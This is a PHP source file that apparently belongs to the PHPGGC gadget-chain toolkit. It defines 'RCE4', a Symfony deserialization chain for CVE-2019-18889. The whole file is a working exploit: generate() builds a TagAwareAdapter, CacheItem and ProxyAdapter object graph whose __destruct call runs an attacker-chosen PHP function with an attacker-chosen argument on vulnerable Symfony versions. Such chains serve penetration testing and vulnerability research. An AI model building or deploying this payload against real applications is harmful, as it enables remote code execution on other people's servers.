<?php

namespace GadgetChain\Symfony;

class RCE4 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '3.4.0-34, 4.2.0-11, 4.3.0-7';
    public static $vector = '__destruct';
    public static $author = 'wisdomtree';
    public static $information = 'Execute $function with $parameter (CVE-2019-18889)';
    public static $parameters = [
        'function',
        'parameter'
    ];

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Symfony\Component\Cache\Adapter\TagAwareAdapter(array(
               new \Symfony\Component\Cache\CacheItem(1, $parameter)),
               new \Symfony\Component\Cache\Adapter\ProxyAdapter(1 , $function)); 
    }
}

?>
